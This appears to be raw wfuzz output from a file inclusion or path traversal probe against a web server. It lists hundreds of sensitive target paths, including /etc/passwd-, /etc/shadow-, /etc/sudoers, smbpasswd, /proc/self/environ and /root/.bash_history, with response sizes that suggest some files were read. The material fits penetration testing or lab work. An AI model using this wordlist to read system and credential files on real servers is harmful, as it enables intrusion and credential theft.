000000271:   500        0 L      0 W        0 Ch        "/etc/apache2/apache.conf"                                                                                                                                                 
000000275:   500        0 L      0 W        0 Ch        "/etc/apache2/conf/httpd.conf"                                                                                                                                             
000000270:   500        0 L      0 W        0 Ch        "/etc/apache/httpd.conf"                                                                                                                                                   
000000272:   500        0 L      0 W        0 Ch        "/etc/apache2/conf.d/charset"                                                                                                                                              
000000269:   500        0 L      0 W        0 Ch        "/etc/apache/default-server.conf"                                                                                                                                          
000000268:   500        0 L      0 W        0 Ch        "/etc/apache/conf/httpd.conf"                                                                                                                                              
000000266:   500        0 L      0 W        0 Ch        "/etc/apache/access.conf"                                                                                                                                                  
000000267:   500        0 L      0 W        0 Ch        "/etc/apache/apache.conf"                                                                                                                                                  
000000264:   500        88 L     467 W      3028 Ch     "/etc/adduser.conf"                                                                                                                                                        
000000263:   500        0 L      0 W        0 Ch        "/bin/php.ini"                                                                                                                                                             
000000262:   500        0 L      0 W        0 Ch        "/apache2/logs/error.log"                                                                                                                                                  
000000260:   500        0 L      0 W        0 Ch        "/apache/php/php.ini"                                                                                                                                                      
000000261:   500        0 L      0 W        0 Ch        "/apache2/logs/access.log"                                                                                                                                                 
000000259:   500        0 L      0 W        0 Ch        "/apache/logs/error.log"                                                                                                                                                   
000000256:   500        0 L      0 W        0 Ch        "~/.xsession"                                                                                                                                                              
000000258:   500        0 L      0 W        0 Ch        "/apache/logs/access.log"                                                                                                                                                  
000000252:   500        0 L      0 W        0 Ch        "~/.wm_style"                                                                                                                                                              
000000254:   500        0 L      0 W        0 Ch        "~/.xinitrc"                                                                                                                                                               
000000255:   500        0 L      0 W        0 Ch        "~/.Xresources"                                                                                                                                                            
000000301:   500        0 L      0 W        0 Ch        "/etc/apache2/vhosts.d/default_vhost.include"                                                                                                                              
000000303:   500        0 L      0 W        0 Ch        "/etc/apache22/httpd.conf"                                                                                                                                                 
000000315:   500        0 L      0 W        0 Ch        "/etc/chkrootkit.conf"                                                                                                                                                     
000000307:   500        0 L      0 W        0 Ch        "/etc/bash_completion.d/debconf"                                                                                                                                           
000000331:   500        0 L      0 W        0 Ch        "/etc/dhcp3/dhcpd.conf"                                                                                                                                                    
000000350:   500        0 L      0 W        0 Ch        "/etc/httpd/apache2.conf"                                                                                                                                                  
000000349:   500        0 L      0 W        0 Ch        "/etc/httpd/apache.conf"                                                                                                                                                   
000000347:   500        0 L      0 W        0 Ch        "/etc/http/httpd.conf"                                                                                                                                                     
000000346:   500        0 L      0 W        0 Ch        "/etc/http/conf/httpd.conf"                                                                                                                                                
000000348:   500        0 L      0 W        0 Ch        "/etc/httpd.conf"                                                                                                                                                          
000000344:   500        3 L      18 W       92 Ch       "/etc/host.conf"                                                                                                                                                           
000000345:   500        1 L      1 W        7 Ch        "/etc/hostname"                                                                                                                                                            
000000343:   200        138 L    819 W      4861 Ch     "/etc/hdparm.conf"                                                                                                                                                         
000000341:   500        55 L     55 W       722 Ch      "/etc/group"                                                                                                                                                               
000000342:   500        55 L     55 W       728 Ch      "/etc/group-"                                                                                                                                                              
000000340:   500        8 L      43 W       280 Ch      "/etc/fuse.conf"                                                                                                                                                           
000000333:   500        0 L      0 W        0 Ch        "/etc/e2fsck.conf"                                                                                                                                                         
000000339:   500        14 L     22 W       132 Ch      "/etc/ftpusers"                                                                                                                                                            
000000338:   500        0 L      0 W        0 Ch        "/etc/foremost.conf"                                                                                                                                                       
000000337:   500        0 L      0 W        0 Ch        "/etc/firewall.rules"                                                                                                                                                      
000000336:   500        0 L      0 W        0 Ch        "/etc/fedora-release"                                                                                                                                                      
000000335:   500        0 L      0 W        0 Ch        "/etc/etter.conf"                                                                                                                                                          
000000334:   500        0 L      0 W        0 Ch        "/etc/esound/esd.conf"                                                                                                                                                     
000000330:   500        0 L      0 W        0 Ch        "/etc/dhcp3/dhclient.conf"                                                                                                                                                 
000000332:   500        0 L      0 W        0 Ch        "/etc/dns2tcpd.conf"                                                                                                                                                       
000000329:   500        54 L     207 W      1735 Ch     "/etc/dhcp/dhclient.conf"                                                                                                                                                  
000000328:   500        20 L     99 W       604 Ch      "/etc/deluser.conf"                                                                                                                                                        
000000327:   500        33 L     165 W      1216 Ch     "/etc/default/grub"                                                                                                                                                        
000000326:   500        1 L      1 W        11 Ch       "/etc/debian_version"                                                                                                                                                      
000000324:   500        0 L      0 W        0 Ch        "/etc/cvs-pserver.conf"                                                                                                                                                    
000000325:   500        83 L     485 W      2969 Ch     "/etc/debconf.conf"                                                                                                                                                        
000000323:   500        0 L      0 W        0 Ch        "/etc/cvs-cron.conf"                                                                                                                                                       
000000322:   500        0 L      0 W        0 Ch        "/etc/cups/printers.conf"                                                                                                                                                  
000000320:   500        0 L      0 W        0 Ch        "/etc/cups/cupsd.conf.default"                                                                                                                                             
000000321:   500        0 L      0 W        0 Ch        "/etc/cups/pdftops.conf"                                                                                                                                                   
000000319:   500        0 L      0 W        0 Ch        "/etc/cups/acroread.conf"                                                                                                                                                  
000000318:   500        1 L      8 W        54 Ch       "/etc/crypttab"                                                                                                                                                            
000000317:   500        0 L      0 W        0 Ch        "/etc/clamav/freshclam.conf"                                                                                                                                               
000000316:   500        0 L      0 W        0 Ch        "/etc/clamav/clamd.conf"                                                                                                                                                   
000000314:   500        0 L      0 W        0 Ch        "/etc/casper.conf"                                                                                                                                                         
000000313:   200        144 L    207 W      5889 Ch     "/etc/ca-certificates.conf.dpkg-old"                                                                                                                                       
000000311:   500        0 L      0 W        0 Ch        "/etc/bluetooth/rfcomm.conf"                                                                                                                                               
000000312:   200        146 L    209 W      5977 Ch     "/etc/ca-certificates.conf"                                                                                                                                                
000000310:   500        0 L      0 W        0 Ch        "/etc/bluetooth/network.conf"                                                                                                                                              
000000309:   500        0 L      0 W        0 Ch        "/etc/bluetooth/main.conf"                                                                                                                                                 
000000306:   500        71 L     329 W      2319 Ch     "/etc/bash.bashrc"                                                                                                                                                         
000000351:   500        0 L      0 W        0 Ch        "/etc/httpd/conf"                                                                                                                                                          
000000353:   500        0 L      0 W        0 Ch        "/etc/httpd/conf.d/php.conf"                                                                                                                                               
000000308:   500        0 L      0 W        0 Ch        "/etc/bluetooth/input.conf"                                                                                                                                                
000000305:   500        0 L      0 W        0 Ch        "/etc/avahi/avahi-daemon.conf"                                                                                                                                             
000000302:   500        0 L      0 W        0 Ch        "/etc/apache22/conf/httpd.conf"                                                                                                                                            
000000304:   500        0 L      0 W        0 Ch        "/etc/apt/apt.conf"                                                                                                                                                        
000000357:   500        0 L      0 W        0 Ch        "/etc/httpd/extra/httpd-ssl.conf"                                                                                                                                          
000000361:   500        0 L      0 W        0 Ch        "/etc/ipfw.rules"                                                                                                                                                          
000000360:   500        0 L      0 W        0 Ch        "/etc/ipfw.conf"                                                                                                                                                           
000000359:   500        0 L      0 W        0 Ch        "/etc/init.d"                                                                                                                                                              
000000356:   500        0 L      0 W        0 Ch        "/etc/httpd/conf/apache2.conf"                                                                                                                                             
000000355:   500        0 L      0 W        0 Ch        "/etc/httpd/conf/apache.conf"                                                                                                                                              
000000358:   500        0 L      0 W        0 Ch        "/etc/httpd/mod_php.conf"                                                                                                                                                  
000000352:   500        0 L      0 W        0 Ch        "/etc/httpd/conf.d"                                                                                                                                                        
000000354:   500        0 L      0 W        0 Ch        "/etc/httpd/conf.d/squirrelmail.conf"                                                                                                                                      
000000362:   500        1 L      3 W        19 Ch       "/etc/issue.net"                                                                                                                                                           
000000364:   500        6 L      22 W       144 Ch      "/etc/kernel-img.conf"                                                                                                                                                     
000000368:   500        0 L      0 W        0 Ch        "/etc/lighttpd/lighthttpd.conf"                                                                                                                                            
000000376:   500        0 L      0 W        0 Ch        "/etc/miredo/miredo.conf"                                                                                                                                                  
000000387:   500        0 L      0 W        0 Ch        "/etc/muddleftpd/muddleftpd.conf"                                                                                                                                          
000000388:   500        0 L      0 W        0 Ch        "/etc/muddleftpd/muddleftpd.passwd"                                                                                                                                        
000000386:   500        0 L      0 W        0 Ch        "/etc/muddleftpd.com"                                                                                                                                                      
000000385:   500        0 L      0 W        0 Ch        "/etc/mtools.conf"                                                                                                                                                         
000000384:   500        0 L      0 W        0 Ch        "/etc/mono/config"                                                                                                                                                         
000000383:   500        0 L      0 W        0 Ch        "/etc/mono/2.0/web.config"                                                                                                                                                 
000000382:   500        0 L      0 W        0 Ch        "/etc/mono/2.0/machine.config"                                                                                                                                             
000000381:   500        0 L      0 W        0 Ch        "/etc/mono/1.0/machine.config"                                                                                                                                             
000000380:   500        5 L      36 W       195 Ch      "/etc/modules"                                                                                                                                                             
000000379:   500        0 L      0 W        0 Ch        "/etc/modprobe.d/vmware-tools.conf"                                                                                                                                        
000000375:   500        0 L      0 W        0 Ch        "/etc/miredo.conf"                                                                                                                                                         
000000378:   500        0 L      0 W        0 Ch        "/etc/miredo-server.conf"                                                                                                                                                  
000000377:   500        0 L      0 W        0 Ch        "/etc/miredo/miredo-server.conf"                                                                                                                                           
000000374:   200        131 L    715 W      5174 Ch     "/etc/manpath.config"                                                                                                                                                      
000000373:   500        0 L      0 W        0 Ch        "/etc/mandrake-release"                                                                                                                                                    
000000369:   200        341 L    1753 W     10550 Ch    "/etc/login.defs"                                                                                                                                                          
000000372:   500        0 L      0 W        0 Ch        "/etc/mail/sendmail.conf"                                                                                                                                                  
000000367:   500        17 L     40 W       332 Ch      "/etc/ldap/ldap.conf"                                                                                                                                                      
000000370:   500        36 L     114 W      703 Ch      "/etc/logrotate.conf"                                                                                                                                                      
000000389:   500        0 L      0 W        0 Ch        "/etc/muddleftpd/mudlog"                                                                                                                                                   
000000366:   500        2 L      2 W        34 Ch       "/etc/ld.so.conf"                                                                                                                                                          
000000371:   200        543 L    1307 W     14867 Ch    "/etc/ltrace.conf"                                                                                                                                                         
000000363:   500        0 L      0 W        0 Ch        "/etc/kbd/config"                                                                                                                                                          
000000395:   500        0 L      0 W        0 Ch        "/etc/nginx/sites-available/default"                                                                                                                                       
000000391:   500        0 L      0 W        0 Ch        "/etc/muddleftpd/passwd"                                                                                                                                                   
000000365:   500        0 L      0 W        0 Ch        "/etc/kernel-pkg.conf"                                                                                                                                                     
000000438:   500        0 L      0 W        0 Ch        "/etc/sensors3.conf"                                                                                                                                                       
000000435:   500        65 L     412 W      2179 Ch     "/etc/security/time.conf"                                                                                                                                                  
000000403:   500        0 L      0 W        0 Ch        "/etc/password.master"                                                                                                                                                     
000000419:   500        0 L      0 W        0 Ch        "/etc/samba/smb.conf.user"                                                                                                                                                 
000000437:   500        0 L      0 W        0 Ch        "/etc/sensors.conf"                                                                                                                                                        
000000432:   500        73 L     499 W      2972 Ch     "/etc/security/pam_env.conf"                                                                                                                                               
000000436:   500        0 L      0 W        0 Ch        "/etc/security/user"                                                                                                                                                       
000000433:   500        0 L      0 W        0 Ch        "/etc/security/passwd"                                                                                                                                                     
000000434:   500        11 L     70 W       419 Ch      "/etc/security/sepermit.conf"                                                                                                                                              
000000431:   500        0 L      0 W        0 Ch        "/etc/security/opasswd"                                                                                                                                                    
000000430:   500        28 L     217 W      1440 Ch     "/etc/security/namespace.conf"                                                                                                                                             
000000429:   500        56 L     347 W      2150 Ch     "/etc/security/limits.conf"                                                                                                                                                
000000426:   500        106 L    663 W      3635 Ch     "/etc/security/group.conf"                                                                                                                                                 
000000428:   500        0 L      0 W        0 Ch        "/etc/security/limits"                                                                                                                                                     
000000427:   500        0 L      0 W        0 Ch        "/etc/security/lastlog"                                                                                                                                                    
000000422:   200        122 L    802 W      4620 Ch     "/etc/security/access.conf"                                                                                                                                                
000000424:   500        0 L      0 W        0 Ch        "/etc/security/failedlogin"                                                                                                                                                
000000421:   500        0 L      0 W        0 Ch        "/etc/samba/smbusers"                                                                                                                                                      
000000425:   500        0 L      0 W        0 Ch        "/etc/security/group"                                                                                                                                                      
000000423:   500        0 L      0 W        0 Ch        "/etc/security/environ"                                                                                                                                                    
000000418:   500        0 L      0 W        0 Ch        "/etc/samba/samba.conf"                                                                                                                                                    
000000420:   500        0 L      0 W        0 Ch        "/etc/samba/smbpasswd"                                                                                                                                                     
000000414:   500        0 L      0 W        0 Ch        "/etc/resolvconf/update-libc.d/sendmail"                                                                                                                                   
000000417:   500        0 L      0 W        0 Ch        "/etc/samba/private/smbpasswd"                                                                                                                                             
000000416:   500        0 L      0 W        0 Ch        "/etc/samba/netlogon"                                                                                                                                                      
000000415:   500        0 L      0 W        0 Ch        "/etc/samba/dhcp.conf"                                                                                                                                                     
000000410:   500        0 L      0 W        0 Ch        "/etc/pulse/client.conf"                                                                                                                                                   
000000411:   500        0 L      0 W        0 Ch        "/etc/pure-ftpd/pureftpd.pdb"                                                                                                                                              
000000413:   500        0 L      0 W        0 Ch        "/etc/rc.d/rc.httpd"                                                                                                                                                       
000000412:   500        0 L      0 W        0 Ch        "/etc/rc.conf"                                                                                                                                                             
000000406:   500        0 L      0 W        0 Ch        "/etc/postgresql/pg_hba.conf"                                                                                                                                              
000000407:   500        0 L      0 W        0 Ch        "/etc/postgresql/postgresql.conf"                                                                                                                                          
000000408:   500        0 L      0 W        0 Ch        "/etc/proftpd/modules.conf"                                                                                                                                                
000000402:   500        0 L      0 W        0 Ch        "/etc/passwd~"                                                                                                                                                             
000000409:   500        0 L      0 W        0 Ch        "/etc/protpd/proftpd.conf"                                                                                                                                                 
000000405:   500        0 L      0 W        0 Ch        "/etc/phpmyadmin/config.inc.php"                                                                                                                                           
000000400:   500        0 L      0 W        0 Ch        "/etc/pam.d/proftpd"                                                                                                                                                       
000000399:   500        15 L     59 W       552 Ch      "/etc/pam.conf"                                                                                                                                                            
000000401:   500        32 L     41 W       1659 Ch     "/etc/passwd-"                                                                                                                                                             
000000404:   500        0 L      0 W        0 Ch        "/etc/php5/cgi/php.ini"                                                                                                                                                    
000000398:   500        0 L      0 W        0 Ch        "/etc/osxhttpd/osxhttpd.conf"                                                                                                                                              
000000397:   500        12 L     17 W       386 Ch      "/etc/os-release"                                                                                                                                                          
000000396:   500        0 L      0 W        0 Ch        "/etc/openldap/ldap.conf"                                                                                                                                                  
000000393:   500        0 L      0 W        0 Ch        "/etc/newsyslog.conf"                                                                                                                                                      
000000390:   500        0 L      0 W        0 Ch        "/etc/muddleftpd/mudlogd.conf"                                                                                                                                             
000000394:   500        0 L      0 W        0 Ch        "/etc/nginx/nginx.conf"                                                                                                                                                    
000000439:   500        0 L      0 W        0 Ch        "/etc/shadow-"                                                                                                                                                             
000000441:   500        0 L      0 W        0 Ch        "/etc/slackware-release"                                                                                                                                                   
000000392:   500        0 L      0 W        0 Ch        "/etc/mysql/conf.d/old_passwords.cnf"                                                                                                                                      
000000445:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/apache.conf"                                                                                                                                            
000000469:   500        0 L      0 W        0 Ch        "/etc/tor/tor-tsocks.conf"                                                                                                                                                 
000000453:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/sqspell_config.php"                                                                                                                                     
000000488:   500        0 L      0 W        0 Ch        "/home/bin/stable/apache/php.ini"                                                                                                                                          
000000485:   500        0 L      0 W        0 Ch        "/etc/X11/xorg.conf.orig"                                                                                                                                                  
000000487:   500        0 L      0 W        0 Ch        "/etc/X11/xorg.conf-vmware"                                                                                                                                                
000000486:   500        0 L      0 W        0 Ch        "/etc/X11/xorg.conf-vesa"                                                                                                                                                  
000000483:   500        0 L      0 W        0 Ch        "/etc/X11/xorg.conf"                                                                                                                                                       
000000482:   500        0 L      0 W        0 Ch        "/etc/wicd/wireless-settings.conf"                                                                                                                                         
000000484:   500        0 L      0 W        0 Ch        "/etc/X11/xorg.conf.BeforeVMwareToolsInstall"                                                                                                                              
000000481:   500        0 L      0 W        0 Ch        "/etc/wicd/wired-settings.conf"                                                                                                                                            
000000480:   500        0 L      0 W        0 Ch        "/etc/wicd/manager-settings.conf"                                                                                                                                          
000000479:   500        0 L      0 W        0 Ch        "/etc/wicd/dhclient.conf.template.default"                                                                                                                                 
000000478:   500        0 L      0 W        0 Ch        "/etc/webmin/miniserv.users"                                                                                                                                               
000000475:   500        0 L      0 W        0 Ch        "/etc/vmware-tools/tpvmlp.conf"                                                                                                                                            
000000477:   500        0 L      0 W        0 Ch        "/etc/webmin/miniserv.conf"                                                                                                                                                
000000476:   500        0 L      0 W        0 Ch        "/etc/vmware-tools/vmware-tools-libraries.conf"                                                                                                                            
000000474:   500        0 L      0 W        0 Ch        "/etc/vmware-tools/config"                                                                                                                                                 
000000472:   500        0 L      0 W        0 Ch        "/etc/updatedb.conf.BeforeVMwareToolsInstall"                                                                                                                              
000000473:   500        0 L      0 W        0 Ch        "/etc/utmp"                                                                                                                                                                
000000471:   500        4 L      45 W       403 Ch      "/etc/updatedb.conf"                                                                                                                                                       
000000468:   500        0 L      0 W        0 Ch        "/etc/tinyproxy/tinyproxy.conf"                                                                                                                                            
000000470:   500        0 L      0 W        0 Ch        "/etc/tsocks.conf"                                                                                                                                                         
000000467:   500        1 L      1 W        8 Ch        "/etc/timezone"                                                                                                                                                            
000000465:   500        0 L      0 W        0 Ch        "/etc/sysctl.d/10-process-security.conf"                                                                                                                                   
000000466:   500        0 L      0 W        0 Ch        "/etc/sysctl.d/wine.sysctl.conf"                                                                                                                                           
000000464:   500        12 L     69 W       509 Ch      "/etc/sysctl.d/10-network-security.conf"                                                                                                                                   
000000463:   500        3 L      14 W       77 Ch       "/etc/sysctl.d/10-console-messages.conf"                                                                                                                                   
000000461:   500        0 L      0 W        0 Ch        "/etc/sysconfig/network-scripts/ifcfg-eth0"                                                                                                                                
000000462:   500        77 L     339 W      2683 Ch     "/etc/sysctl.conf"                                                                                                                                                         
000000460:   500        0 L      0 W        0 Ch        "/etc/sw-cp-server/applications.d/plesk.conf"                                                                                                                              
000000459:   500        0 L      0 W        0 Ch        "/etc/sw-cp-server/applications.d/00-sso-cpserver.conf"                                                                                                                    
000000458:   500        0 L      0 W        0 Ch        "/etc/SUSE-release"                                                                                                                                                        
000000457:   500        0 L      0 W        0 Ch        "/etc/sudoers"                                                                                                                                                             
000000456:   500        0 L      0 W        0 Ch        "/etc/subversion/config"                                                                                                                                                   
000000455:   500        0 L      0 W        0 Ch        "/etc/stunnel/stunnel.conf"                                                                                                                                                
000000452:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/index.php"                                                                                                                                              
000000450:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/default_pref"                                                                                                                                           
000000454:   500        0 L      0 W        0 Ch        "/etc/sso/sso_config.ini"                                                                                                                                                  
000000451:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/filters_setup.php"                                                                                                                                      
000000449:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/config_local.php"                                                                                                                                       
000000447:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/config/config.php"                                                                                                                                      
000000448:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/config_default.php"                                                                                                                                     
000000443:   500        0 L      0 W        0 Ch        "/etc/smbpasswd"                                                                                                                                                           
000000440:   500        0 L      0 W        0 Ch        "/etc/shadow~"                                                                                                                                                             
000000446:   500        0 L      0 W        0 Ch        "/etc/squirrelmail/config.php"                                                                                                                                             
000000444:   500        0 L      0 W        0 Ch        "/etc/smi.conf"                                                                                                                                                            
000000489:   500        0 L      0 W        0 Ch        "/home/postgres/data/pg_hba.conf"                                                                                                                                          
000000491:   500        0 L      0 W        0 Ch        "/home/postgres/data/PG_VERSION"                                                                                                                                           
000000442:   500        0 L      0 W        0 Ch        "/etc/smb.conf"                                                                                                                                                            
000000495:   500        0 L      0 W        0 Ch        "/http/httpd.conf"                                                                                                                                                         
000000519:   500        0 L      0 W        0 Ch        "/opt/apache/conf/apache2.conf"                                                                                                                                            
000000503:   500        0 L      0 W        0 Ch        "/logs/access.log"                                                                                                                                                         
000000538:   500        0 L      0 W        0 Ch        "/opt/tomcat/conf/tomcat-users.xml"                                                                                                                                        
000000536:   500        0 L      0 W        0 Ch        "/opt/lsws/logs/access.log"                                                                                                                                                
000000535:   500        0 L      0 W        0 Ch        "/opt/lsws/conf/httpd_conf.xml"                                                                                                                                            
000000537:   500        0 L      0 W        0 Ch        "/opt/lsws/logs/error.log"                                                                                                                                                 
000000534:   500        0 L      0 W        0 Ch        "/opt/lampp/logs/error_log"                                                                                                                                                
000000533:   500        0 L      0 W        0 Ch        "/opt/lampp/logs/error.log"                                                                                                                                                
000000531:   500        0 L      0 W        0 Ch        "/opt/lampp/logs/access.log"                                                                                                                                               
000000532:   500        0 L      0 W        0 Ch        "/opt/lampp/logs/access_log"                                                                                                                                               
000000530:   500        0 L      0 W        0 Ch        "/opt/httpd/conf/apache2.conf"                                                                                                                                             
000000529:   500        0 L      0 W        0 Ch        "/opt/httpd/conf/apache.conf"                                                                                                                                              
000000528:   500        0 L      0 W        0 Ch        "/opt/httpd/apache2.conf"                                                                                                                                                  
000000525:   500        0 L      0 W        0 Ch        "/opt/apache2/conf/httpd.conf"                                                                                                                                             
000000527:   500        0 L      0 W        0 Ch        "/opt/httpd/apache.conf"                                                                                                                                                   
000000526:   500        0 L      0 W        0 Ch        "/opt/apache22/conf/httpd.conf"                                                                                                                                            
000000524:   500        0 L      0 W        0 Ch        "/opt/apache2/conf/apache2.conf"                                                                                                                                           
000000522:   500        0 L      0 W        0 Ch        "/opt/apache2/apache2.conf"                                                                                                                                                
000000523:   500        0 L      0 W        0 Ch        "/opt/apache2/conf/apache.conf"                                                                                                                                            
000000521:   500        0 L      0 W        0 Ch        "/opt/apache2/apache.conf"                                                                                                                                                 
000000518:   500        0 L      0 W        0 Ch        "/opt/apache/conf/apache.conf"                                                                                                                                             
000000520:   500        0 L      0 W        0 Ch        "/opt/apache/conf/httpd.conf"                                                                                                                                              
000000517:   500        0 L      0 W        0 Ch        "/opt/apache/apache2.conf"                                                                                                                                                 
000000515:   500        0 L      0 W        0 Ch        "/NetServer/bin/stable/apache/php.ini"                                                                                                                                     
000000513:   500        0 L      0 W        0 Ch        "/MySQL/my.cnf"                                                                                                                                                            
000000514:   500        0 L      0 W        0 Ch        "/MySQL/my.ini"                                                                                                                                                            
000000511:   500        0 L      0 W        0 Ch        "/MySQL/data/mysql-bin.index"                                                                                                                                              
000000516:   500        0 L      0 W        0 Ch        "/opt/apache/apache.conf"                                                                                                                                                  
000000512:   500        0 L      0 W        0 Ch        "/MySQL/data/mysql-bin.log"                                                                                                                                                
000000510:   500        0 L      0 W        0 Ch        "/MySQL/data/mysql.log"                                                                                                                                                    
000000507:   500        0 L      0 W        0 Ch        "/mysql/bin/my.ini"                                                                                                                                                        
000000509:   500        0 L      0 W        0 Ch        "/MySQL/data/mysql.err"                                                                                                                                                    
000000508:   500        0 L      0 W        0 Ch        "/MySQL/data/{HOST}.err"                                                                                                                                                   
000000502:   500        0 L      0 W        0 Ch        "/Library/WebServer/Documents/index.php"                                                                                                                                   
000000499:   500        0 L      0 W        0 Ch        "/Library/WebServer/Documents/default.php"                                                                                                                                 
000000505:   500        0 L      0 W        0 Ch        "/logs/error.log"                                                                                                                                                          
000000501:   500        0 L      0 W        0 Ch        "/Library/WebServer/Documents/index.html"                                                                                                                                  
000000506:   500        0 L      0 W        0 Ch        "/logs/error_log"                                                                                                                                                          
000000504:   500        0 L      0 W        0 Ch        "/logs/access_log"                                                                                                                                                         
000000500:   500        0 L      0 W        0 Ch        "/Library/WebServer/Documents/index.htm"                                                                                                                                   
000000494:   500        0 L      0 W        0 Ch        "/home2/bin/stable/apache/php.ini"                                                                                                                                         
000000498:   500        0 L      0 W        0 Ch        "/Library/WebServer/Documents/default.html"                                                                                                                                
000000497:   500        0 L      0 W        0 Ch        "/Library/WebServer/Documents/default.htm"                                                                                                                                 
000000493:   500        0 L      0 W        0 Ch        "/home/user/lighttpd/lighttpd.conf"                                                                                                                                        
000000496:   500        0 L      0 W        0 Ch        "/Library/WebServer/Documents/.htaccess"                                                                                                                                   
000000541:   500        0 L      0 W        0 Ch        "/opt/xampp/logs/access.log"                                                                                                                                               
000000490:   500        0 L      0 W        0 Ch        "/home/postgres/data/pg_ident.conf"                                                                                                                                        
000000492:   500        0 L      0 W        0 Ch        "/home/postgres/data/postgresql.conf"                                                                                                                                      
000000545:   500        0 L      0 W        0 Ch        "/php/php.ini"                                                                                                                                                             
000000539:   500        0 L      0 W        0 Ch        "/opt/tomcat/logs/catalina.err"                                                                                                                                            
000000553:   500        0 L      0 W        0 Ch        "/private/etc/squirrelmail/config/config.php"                                                                                                                              
000000569:   500        0 L      0 W        0 Ch        "/proc/self/fd/4"                                                                                                                                                          
000000588:   500        0 L      0 W        0 Ch        "/usr/apache2/conf/httpd.conf"                                                                                                                                             
000000587:   500        0 L      0 W        0 Ch        "/usr/apache/conf/httpd.conf"                                                                                                                                              
000000586:   500        0 L      0 W        0 Ch        "/tmp/access.log"                                                                                                                                                          
000000585:   500        0 L      0 W        0 Ch        "/System/Library/WebObjects/Adaptors/Apache2.2/apache.conf"                                                                                                                
000000584:   500        0 L      0 W        0 Ch        "/srv/www/htdos/squirrelmail/config/config.php"                                                                                                                            
000000582:   500        0 L      0 W        0 Ch        "/root/.ksh_history"                                                                                                                                                       
000000581:   500        0 L      0 W        0 Ch        "/root/.bashrc"                                                                                                                                                            
000000583:   500        0 L      0 W        0 Ch        "/root/.Xauthority"                                                                                                                                                        
000000580:   500        0 L      0 W        0 Ch        "/root/.bash_logout"                                                                                                                                                       
000000579:   500        0 L      0 W        0 Ch        "/root/.bash_history"                                                                                                                                                      
000000578:   500        0 L      0 W        0 Ch        "/root/.bash_config"                                                                                                                                                       
000000572:   500        0 L      0 W        0 Ch        "/proc/self/fd/7"                                                                                                                                                          
000000577:   500        54 L     131 W      1306 Ch     "/proc/self/status"                                                                                                                                                        
000000575:   500        34 L     204 W      2475 Ch     "/proc/self/mounts"                                                                                                                                                        
000000574:   500        0 L      0 W        0 Ch        "/proc/self/fd/9"                                                                                                                                                          
000000576:   500        1 L      52 W       320 Ch      "/proc/self/stat"                                                                                                                                                          
000000573:   500        0 L      0 W        0 Ch        "/proc/self/fd/8"                                                                                                                                                          
000000571:   500        0 L      0 W        0 Ch        "/proc/self/fd/6"                                                                                                                                                          
000000568:   500        0 L      0 W        0 Ch        "/proc/self/fd/3"                                                                                                                                                          
000000570:   500        0 L      0 W        0 Ch        "/proc/self/fd/5"                                                                                                                                                          
000000567:   500        0 L      0 W        0 Ch        "/proc/self/fd/2"                                                                                                                                                          
000000566:   500        0 L      0 W        0 Ch        "/proc/self/fd/15"                                                                                                                                                         
000000565:   500        0 L      0 W        0 Ch        "/proc/self/fd/14"                                                                                                                                                         
000000563:   500        0 L      0 W        0 Ch        "/proc/self/fd/12"                                                                                                                                                         
000000561:   500        0 L      0 W        0 Ch        "/proc/self/fd/10"                                                                                                                                                         
000000564:   500        0 L      0 W        0 Ch        "/proc/self/fd/13"                                                                                                                                                         
000000562:   500        0 L      0 W        0 Ch        "/proc/self/fd/11"                                                                                                                                                         
000000560:   500        0 L      0 W        0 Ch        "/proc/self/fd/1"                                                                                                                                                          
000000559:   500        0 L      0 W        0 Ch        "/proc/self/fd/0"                                                                                                                                                          
000000558:   500        0 L      0 W        0 Ch        "/proc/self/environ"                                                                                                                                                       
000000557:   500        0 L      1 W        27 Ch       "/proc/self/cmdline"                                                                                                                                                       
000000556:   500        3 L      41 W       384 Ch      "/proc/net/udp"                                                                                                                                                            
000000552:   500        0 L      0 W        0 Ch        "/private/etc/httpd/httpd.conf.default"                                                                                                                                    
000000555:   500        4 L      63 W       600 Ch      "/proc/net/tcp"                                                                                                                                                            
000000551:   500        0 L      0 W        0 Ch        "/private/etc/httpd/httpd.conf"                                                                                                                                            
000000550:   500        0 L      0 W        0 Ch        "/private/etc/httpd/apache2.conf"                                                                                                                                          
000000554:   500        59 L     116 W      546 Ch      "/proc/devices"                                                                                                                                                            
000000549:   500        0 L      0 W        0 Ch        "/private/etc/httpd/apache.conf"                                                                                                                                           
000000548:   500        0 L      0 W        0 Ch        "/PostgreSQL/log/pgadmin.log"                                                                                                                                              
000000544:   500        0 L      0 W        0 Ch        "/opt/xampp/logs/error_log"                                                                                                                                                
000000547:   500        0 L      0 W        0 Ch        "/php5/php.ini"                                                                                                                                                            
000000543:   500        0 L      0 W        0 Ch        "/opt/xampp/logs/error.log"                                                                                                                                                
000000540:   500        0 L      0 W        0 Ch        "/opt/tomcat/logs/catalina.out"                                                                                                                                            
000000546:   500        0 L      0 W        0 Ch        "/php4/php.ini"                                                                                                                                                            
000000542:   500        0 L      0 W        0 Ch        "/opt/xampp/logs/access_log"                                                                                                                                               
000000591:   500        0 L      0 W        0 Ch        "/usr/home/user/var/log/lighttpd.error.log"                                                                                                                                
000000589:   500        0 L      0 W        0 Ch        "/usr/home/user/lighttpd/lighttpd.conf"                                                                                                                                    
000000595:   500        0 L      0 W        0 Ch        "/usr/lib/security/mkuser.default"                                                                                                                                         
000000603:   500        0 L      0 W        0 Ch        "/usr/local/apache/conf/vhosts.conf"                                                                                                                                       
000000638:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache/vhosts.conf"                                                                                                                                        
000000619:   500        0 L      0 W        0 Ch        "/usr/local/apache2/conf/modsec.conf"                                                                                                                                      
000000637:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache/httpd.conf"                                                                                                                                         
000000636:   500        0 L      0 W        0 Ch        "/usr/local/etc/apache/conf/httpd.conf"                                                                                                                                    
000000635:   500        0 L      0 W        0 Ch        "/usr/local/apps/apache22/conf/httpd.conf"                                                                                                                                 
000000634:   500        0 L      0 W        0 Ch        "/usr/local/apps/apache2/conf/httpd.conf"                                                                                                                                  
000000632:   500        0 L      0 W        0 Ch        "/usr/local/apache22/httpd.conf"                                                                                                                                           
